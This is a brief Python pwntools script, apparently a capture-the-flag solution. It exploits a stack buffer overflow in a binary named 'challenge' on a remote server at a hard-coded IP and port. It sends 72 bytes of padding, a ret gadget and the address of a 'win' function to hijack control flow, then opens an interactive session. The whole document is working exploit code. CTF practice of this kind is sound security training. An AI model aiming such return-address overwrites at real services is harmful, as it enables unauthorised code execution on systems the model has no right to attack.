from pwn import *
elf = ELF("./challenge")
context(os="linux", arch="amd64")
# p = elf.process()
p = remote("45.76.177.238", 9331)
offset = 72
p.recvuntil("name?\n")
payload =  b"A"*offset # Garbage
payload += p64(0x4013c4) # Ret gadet for stack alignment
payload += p64(elf.symbols["win"]) # Address of win function
p.sendline(payload)
p.interactive()